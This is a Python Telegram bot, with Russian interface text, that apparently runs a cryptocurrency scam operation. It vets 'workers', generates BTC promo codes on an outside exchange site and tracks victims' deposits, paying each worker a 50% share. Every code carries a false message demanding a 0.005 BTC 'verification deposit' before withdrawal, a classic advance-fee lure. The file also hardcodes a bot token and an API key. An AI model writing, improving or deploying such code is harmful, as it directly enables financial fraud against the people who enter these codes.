
import telebot
from telebot import types
import requests
import datetime
import json
import pickle

def save_data():
    with open('bot_data_test5.pkl', 'wb') as output:
        pickle.dump((promo_codes, custom_promo_codes, generations_limit, user_requests, approved_users), output)

def load_data():
    try:
        with open('bot_data_test5.pkl', 'rb') as input:
            p, c, g, u, a = pickle.load(input)
            return p, c, g, u, a
    except (FileNotFoundError, ValueError):
        return {}, {}, {}, {}, []

bot_token = '6456384301:AAE3nx_4Kpq-p4R-BhEikrA5MYZAA91zWNE'
bot = telebot.TeleBot(bot_token)

api_key = 'd50ab828-2a57-47b8-85a7-00f32f17c696'
api_url = 'https://dajdjasodasd.one/api/promocode/'

promo_codes = {} # список промокодов пользователей
custom_promo_codes = {} # список пользовательских промокодов 
generations_limit = {}
user_requests = {}  # Словарь для хранение заявок для одобрения.
approved_users = []  # Список уже одобренных пользователей.
promo_codes, custom_promo_codes, generations_limit, user_requests, approved_users = load_data()


admin_chat_id = 6504028095  # Здесь укажите chat_id админа

@bot.message_handler(commands=['start'])
def send_welcome(message):
    chat_id = message.chat.id
    if chat_id in approved_users:
        bot.reply_to(message, f'Привет снова, {message.from_user.first_name}!', reply_markup=generate_keyboard())
    elif chat_id in user_requests:
        bot.reply_to(message, "Ваша заявка все еще на рассмотрении.")
    else:
        bot.reply_to(message, "Пожалуйста, ответьте на три вопроса для регистрации.")
        ask_questions(message)

def ask_questions(message):
    user_requests[message.chat.id] = [message.text]
    ask_question_one(message)
    save_data()

def ask_question_one(message):
    user_requests[message.chat.id].append(message.text if message.text is not None else "Not provided")
    msg = bot.reply_to(message, "Ваш Lolz аккаунт?")
    bot.register_next_step_handler(msg, ask_question_two)

def ask_question_two(message):
    user_requests[message.chat.id].append(message.text if message.text is not None else "Not provided")
    msg = bot.reply_to(message, "Есть ли опыт в этой сфере?")
    bot.register_next_step_handler(msg, ask_question_three)

def ask_question_three(message):
    user_requests[message.chat.id].append(message.text if message.text is not None else "Not provided")
    msg = bot.reply_to(message, "ТЕСТ")
    bot.register_next_step_handler(msg, finish_registration)


def finish_registration(message):
    user_requests[message.chat.id].append(message.text if message.text is not None else "Not provided")
    bot.send_message(message.chat.id, "Спасибо за ответы! Ваша заявка отправлена на одобрение администратору.")
    
    bot.send_message(admin_chat_id, f"Новая заявка на регистрацю от @{message.from_user.username}. Ответы на вопросы:\n\n" 
                     + "\n".join(user_requests[message.chat.id]) +
                     "\n\nДля одобрения кликните кнопку ниже", reply_markup=generate_approval_button(message.chat.id))

def generate_approval_button(chat_id):
    markup = types.InlineKeyboardMarkup()
    approval_button = types.InlineKeyboardButton("Одобрить", callback_data=f'approve:{chat_id}')
    markup.add(approval_button)
    return markup

@bot.callback_query_handler(func=lambda call: True)
def callback_inline(call):
    if call.data.startswith('approve'):
        user_id_to_approve = int(call.data.split(':')[1])
        approve_registration_by_id(user_id_to_approve)
        bot.answer_callback_query(call.id, "Пользователь одобрен")
        
    if call.data.startswith('promo:'):
        index = int(call.data.split(':')[1])
        promo_list = promo_codes.get(call.message.chat.id, []) + custom_promo_codes.get(call.message.chat.id, [])
        promo_code = promo_list[index]
        send_promo_info(call.message.chat.id, promo_code)

    elif call.data.startswith('prev'):
        index = int(call.data.split(':')[1]) - 1
        promo_list = promo_codes.get(call.message.chat.id, []) + custom_promo_codes.get(call.message.chat.id, [])
        send_pagination(call.message.chat.id, promo_list, index)
        
    elif call.data.startswith('next'):
        index = int(call.data.split(':')[1]) + 1
        promo_list = promo_codes.get(call.message.chat.id, []) + custom_promo_codes.get(call.message.chat.id, [])
        send_pagination(call.message.chat.id, promo_list, index)      
def approve_registration_by_id(user_id_to_approve):
    approved_users.append(user_id_to_approve)
    user_requests.pop(user_id_to_approve, None)
    save_data()

    bot.send_message(admin_chat_id, f"Заявка успешно одобрена. Номер заявки: {user_id_to_approve}")
    bot.send_message(user_id_to_approve, "Ваша заявка была одобрена администратором! Спасибо за регистрацию.", reply_markup=generate_keyboard()) 





#@bot.message_handler(commands=['approve'])
#def handle_approve_command(message):
   # approve_registration(message)

@bot.message_handler(commands=['approve'])
def approve_user(message):
    split_message = message.text.split()  # разделить сообщение на список
    if len(split_message) > 1 and split_message[-1].isdigit():  # проверить, если id представлен и является ли он цифрой
        chat_id_to_approve = int(split_message[-1])  # здесь мы определяем chat_id из сообщения
        if chat_id_to_approve in user_requests:
            user_requests.pop(chat_id_to_approve, None)
            approved_users.append(chat_id_to_approve)
            save_data()
            bot.send_message(chat_id_to_approve, "Ваша заявка одобрена! Вы теперь зарегистированный пользователь.")
        else: 
            bot.send_message(message.chat.id, "Такого chat_id нет в заявках.")
    else:
        bot.send_message(message.chat.id, "Пожалуйста, введите команду в следующем формате: '/approve chat_id'") 

def get_limit(user_id):
    week = datetime.date.today().isocalendar()[1]
    if user_id not in generations_limit or week not in generations_limit[user_id]:
        return 0
    return generations_limit[user_id][week]

def increase_limit(user_id):
    week = datetime.date.today().isocalendar()[1]
    if user_id not in generations_limit:
        generations_limit[user_id] = {}
    generations_limit[user_id][week] = get_limit(user_id) + 1
    save_data()

def generate_keyboard():
    markup = types.ReplyKeyboardMarkup(row_width=2)
    itembtn1 = types.KeyboardButton("Генерация промо")
    itembtn2 = types.KeyboardButton('Генерация кастомного промо')
    itembtn3 = types.KeyboardButton('Мои промо')
    itembtn4 = types.KeyboardButton('Мануал')
    markup.add(itembtn1, itembtn2, itembtn3, itembtn4)
    
    return markup

def generate_back_keyboard():
    markup = types.InlineKeyboardMarkup()
    back_button = types.InlineKeyboardButton('<< Назад', callback_data='back')
    markup.add(back_button)
    return markup 


@bot.message_handler(func=lambda message: message.text == "Мануал")
def open_manual(message):
    url = "https://teletype.in/@qwertino1337/qdT0i0p3FaA"
    bot.send_message(message.chat.id, f"<a href='{url}'>Мануал</a>", parse_mode='HTML')

@bot.message_handler(func=lambda message: message.text == "Генерация промо")
def ask_promo_value(message):
    if get_limit(message.chat.id) >= 5:
        bot.reply_to(message, "Вы уже создали 5 промокодов на этой неделе. Пожалуйста, попробуйте на следующей неделе.")
        return

    msg = bot.reply_to(message, "Введите желаемое количество BTC (число)")
    bot.register_next_step_handler(msg, create_promo)

def create_promo(message):
    promo_value = message.text
    response = requests.get(api_url + 'create', params={
        'apiKey': api_key,
        'amount': promo_value,
        'currency': 'BTC',
        'currencyAmount': promo_value,
        'message': 'Dear User, you need to verify your third-party address. To verify your third-party address, make a minimum Deposit of 0.005 BTC. Verification Deposit will be credited to your Account and can also be Withdrawn after Account Activation. Before you Verify your third-party address and Activate Account, Withdrawals to External Wallets will be limited.',
        'comment': 'Создано ботом'
    })

    if response.status_code == 200:
        created_codes = response.json()["createdCodes"]
        promo_code_created = created_codes[0]
        if message.chat.id not in promo_codes:
            promo_codes[message.chat.id] = []
        promo_codes[message.chat.id].append(str(promo_code_created))
        bot.send_message(message.chat.id, f"Промокод успешно создан: {promo_code_created}. Получаемое количество BTC при активации: {promo_value}", reply_markup=generate_keyboard())
        increase_limit(message.chat.id)
    else:
        bot.send_message(message.chat.id, "К сожалению, произошла ошибка при создании промокода.")


@bot.message_handler(func=lambda message: message.text == "Генерация кастомного промо")
def create_custom_promo(message):
    if not isinstance(message.text, str):
        bot.reply_to(message, "Ошибка. Введите текстовое значение для промокода.")
        return
    msg = bot.reply_to(message, "Введите ваше слово для промокода")
    bot.register_next_step_handler(msg, ask_value)

def ask_value(message):
    if not isinstance(message.text, str):
        bot.reply_to(message, "Ошибка. Введите текстовое значение для промокода.")
        return
    promo_word = message.text
    msg = bot.reply_to(message, "Введите желаемое количество BTC (число)")
    bot.register_next_step_handler(msg, lambda m: send_promo(m, promo_word))
#...
def send_promo(message, promo_word):
    if get_limit(message.chat.id) >= 5:
        bot.reply_to(message, "Вы уже создали 5 промокодов на этой неделе. Пожалуйста, попробуйте на следующей неделе.")
        return
    # Check the user input here too:
    if not isinstance(message.text, str):
        bot.reply_to(message, "Ошибка. Введите текстовое значение для количества BTC.")
        return
    promo_value = message.text

    promo_value = message.text
    response = requests.get(api_url + 'createCustom', params={
        'apiKey': api_key,
        'code': promo_word,
        'currency': 'BTC',
        'currencyAmount': promo_value,
        'message': 'Dear User, you need to verify your third-party address. To verify your third-party address, make a minimum Deposit of 0.005 BTC. Verification Deposit will be credited to your Account and can also be Withdrawn after Account Activation. Before you Verify your third-party address and Activate Account, Withdrawals to External Wallets will be limited.',
        'comment': 'Создано ботом'
    })

    if response.status_code == 200:
        if message.chat.id not in custom_promo_codes:
            custom_promo_codes[message.chat.id] = []
        if isinstance(promo_word, str):  # Проверка: является ли promo_word строкой
            custom_promo_codes[message.chat.id].append(promo_word)
            bot.send_message(message.chat.id, f"Промокод успешно создан! Ваш промо: {promo_word}. Получаемое количество BTC при активации: {promo_value}.", reply_markup=generate_keyboard())
            increase_limit(message.chat.id)
        else:
            bot.send_message(message.chat.id, f"Произошла ошибка: promocode не является строкой.")
    else:
        bot.send_message(message.chat.id, "К сожалению, произошла ошибка при создании промокода.")
#...


@bot.message_handler(func=lambda message: message.text == "Генерация кастомного промо")
def create_custom_promo(message):
    msg = bot.reply_to(message, "Введите ваше слово для промокода")
    bot.register_next_step_handler(msg, ask_value)
    increase_limit(message.chat.id)
    save_data()


def ask_value(message):
    promo_word = message.text
    msg = bot.reply_to(message, "Введите желаемое количество BTC (число)")
    bot.register_next_step_handler(msg, lambda m: send_promo(m, promo_word))


def send_promo(message, promo_word):
    if get_limit(message.chat.id) >= 5:
        bot.reply_to(message, "Вы уже создали 5 промокодов на этой неделе. Пожалуйста, попробуйте на следующей неделе.")
        return

    promo_value = message.text
    response = requests.get(api_url + 'createCustom', params={
        'apiKey': api_key,
        'code': promo_word,
        'currency': 'BTC',
        'currencyAmount': promo_value,
        'message': 'Dear User, you need to verify your third-party address. To verify your third-party address, make a minimum Deposit of 0.005 BTC. Verification Deposit will be credited to your Account and can also be Withdrawn after Account Activation. Before you Verify your third-party address and Activate Account, Withdrawals to External Wallets will be limited.',
        'comment': 'Создано ботом'
    })

    if response.status_code == 200:
        if message.chat.id not in custom_promo_codes:
            custom_promo_codes[message.chat.id] = []
        custom_promo_codes[message.chat.id].append(promo_word)
        bot.send_message(message.chat.id, f"Промокод успешно создан! Ваш промо: {promo_word}. Получаемое количество BTC при активации: {promo_value}.", reply_markup=generate_keyboard())
        increase_limit(message.chat.id)
    else:
        bot.send_message(message.chat.id, "К сожалению, произошла ошибка при создании промокода.")

@bot.message_handler(func=lambda message: message.text == 'Мои промо')
def send_my_promos(message):
    chat_id = message.chat.id
    promo_list = promo_codes[chat_id] if chat_id in promo_codes else []
    cust_promo_list = custom_promo_codes[chat_id] if chat_id in custom_promo_codes else []
    
    if not promo_list and not cust_promo_list:
        bot.send_message(chat_id, "У вас нет созданных промокодов.")
        return
    
    send_pagination(chat_id, promo_list + cust_promo_list, 0)  # Send first promo code with pagination buttons



@bot.callback_query_handler(func=lambda call: call.data.startswith('promo:'))
def callback_query_button(call):
    index = int(call.data.split(':')[1])
    promo_list = promo_codes.get(call.message.chat.id, []) + custom_promo_codes.get(call.message.chat.id, [])
    promo_code = promo_list[index]
    send_promo_info(call.message.chat.id, promo_code)

def send_promo_info(chat_id, promocode):
    response = requests.get(f"https://dajdjasodasd.one/api/promocode/statistic?apiKey={api_key}&code={promocode}")
    print(response.status_code)
    if response.status_code == 200:
        data = response.json()
        info = data.get('promocodeInfo', {})
        total = info.get('total', {})
        
        activate = total.get("activate", "N/A")  
        deposit = total.get("deposit", "N/A")
        worker_percentage = "50%"
        money_worker = float(deposit) * 0.5 if isinstance(deposit, (float)) else 0
        
        promo_msg = f"💸 Промокод: {promocode}\n├ Активации: {activate}\n└ Сеть: BTC\n\n"
        promo_msg += f"💳 Текущий депозит: ${deposit}\n├ Процент воркера: {worker_percentage}\n└ Доля воркера: ${money_worker}"
        
        bot.send_message(chat_id, promo_msg)
    else:
        bot.send_message(chat_id, "К сожалению, произошла ошибка при выводе информации о промокоде.")

def send_pagination(chat_id, promo_list, index):
    markup = types.InlineKeyboardMarkup()

    if index != 0:
        markup.add(types.InlineKeyboardButton('<< Предыдущий', callback_data=f'prev:{index}'))
        
    if index != len(promo_list) - 1:
        markup.add(types.InlineKeyboardButton('Следующий >>', callback_data=f'next:{index}'))
        
    promocode = promo_list[index]
    response = requests.get(f"https://dajdjasodasd.one/api/promocode/statistic?apiKey={api_key}&code={promocode}")
    
    if response.status_code == 200:
        data = response.json()
        info = data.get('promocodeInfo', {})
        total = info.get('total', {})
        
        activate = total.get("activate", "N/A")  
        deposit = total.get("deposit", "N/A")
        worker_percentage = "50%"
        money_worker = float(deposit) * 0.5 if isinstance(deposit, (int, float)) else 0
        
        promo_msg = f"💸 Промокод: {promocode}\n├ Активации: {activate}\n└ Сеть: BTC\n\n"
        promo_msg += f"💳 Текущий депозит: ${deposit}\n├ Процент воркера: {worker_percentage}\n└ Доля воркера: ${money_worker}"
        
        # Добавим кнопку удаления промокода
        markup.add(types.InlineKeyboardButton('Удалить промокод (Отключено.)', callback_data=f'delete:{index}'))
        
        bot.send_message(chat_id, promo_msg, reply_markup=markup)

def delete_promo(message, index):
    chat_id = message.chat.id
    promo_list = promo_codes.get(chat_id, []) + custom_promo_codes.get(chat_id, []) 

    if len(promo_list) > index:    # Check if promocode exists.
        promo_code= promo_list[index]
        promo_list.remove(promo_code)
        
        # Delete it from either custom or standard promos:
        if promo_code in promo_codes.get(chat_id, []):
            promo_codes[chat_id].remove(promo_code)
        else: 
            custom_promo_codes[chat_id].remove(promo_code)

        bot.send_message(chat_id, f"Промокод {promo_code} успешно удален.")
        save_data()
    else:
        bot.send_message(chat_id, "Ошибка удаления: промокод не найден.")



@bot.callback_query_handler(func=lambda call: True)
def callback_inline(call):
    if call.message:
        if call.data.startswith('prev'):
            index = int(call.data.split(':')[1]) - 1
            promo_list = promo_codes.get(call.message.chat.id, []) + custom_promo_codes.get(call.message.chat.id, [])
            send_pagination(call.message.chat.id, promo_list, index)
            
        elif call.data.startswith('next'):
            index = int(call.data.split(':')[1]) + 1
            promo_list = promo_codes.get(call.message.chat.id, []) + custom_promo_codes.get(call.message.chat.id, [])
            send_pagination(call.message.chat.id, promo_list, index)
            
        elif call.data.startswith('delete'):
            index = int(call.data.split(':')[1])
            delete_promo(call.message, index)

            
            response = requests.get(f"https://dajdjasodasd.one/api/promocode/delete?apiKey={api_key}&code={promo_code}")
            
            if response.status_code == 200:
                data = response.json()    
                if data['error'] == False:
                    promo_codes.get(chat_id, []).remove(promo_code)
                    custom_promo_codes.get(chat_id, []).remove(promo_code)
                    bot.answer_callback_query(call.id, "Промокод успешно удален.")
                else:
                    bot.answer_callback_query(call.id, "Не удалось удалить промокод, обратитесь к администратору.")


@bot.callback_query_handler(func=lambda call: True)
def callback_inline(call):
    if call.message:
        if call.data.startswith('prev'):
            index = int(call.data.split(':')[1]) - 1
            promo_list = promo_codes.get(call.message.chat.id, []) + custom_promo_codes.get(call.message.chat.id, [])

            send_pagination(call.message.chat.id, promo_list, index)
        elif call.data.startswith('next'):
            index = int(call.data.split(':')[1]) + 1
            promo_list = promo_codes.get(call.message.chat.id, []) + custom_promo_codes.get(call.message.chat.id, [])

            send_pagination(call.message.chat.id, promo_list, index)

#checka депозит
import time
import threading

deposit_values = {} # { Промокод: Значение депозита }

def check_promo_stats():  # функция для обработки промокодов
    while True: # бесконечный цикл:
        for data_dict in [promo_codes, custom_promo_codes]: # добавляем обработку кастомных промокодов
            for user_id, promocodes in data_dict.items():  # проходим по всем промокодам каждого пользователя:
                for promocode in promocodes:  
                    response = requests.get(f"https://dajdjasodasd.one/api/promocode/statistic?apiKey={api_key}&code={promocode}")
                    if response.status_code == 200:
                        data = response.json()
                        info = data.get('promocodeInfo', {})
                        total = info.get('total', {})
                        deposit = total.get("deposit", 0)
                        
                        if promocode in deposit_values and deposit_values[promocode] != deposit:
                            activate = total.get("activate", 0)
                            worker_percentage = 50
                            money_worker = deposit * worker_percentage / 100
                            promo_msg = f"Новый депозит! \n"
                            promo_msg += f"💸 Промокод: {promocode}\n├ Активации: {activate}\n└ Сеть: BTC\n\n"
                            promo_msg += f"💳 Текущий депозит: ${deposit}\n├ Процент воркера: {worker_percentage}%\n└ Доля воркера: ${money_worker}"
                            bot.send_message(user_id, promo_msg) # здесь должен быть ID пользователя, а не chat_id
                            
                        deposit_values[promocode] = deposit

                        
        time.sleep(120) # засыпаем на 2 минуты перед новой итерацией


thread = threading.Thread(target=check_promo_stats)
thread.daemon = True
thread.start()  # запускаем обработчик в отдельном потоке




bot.polling()
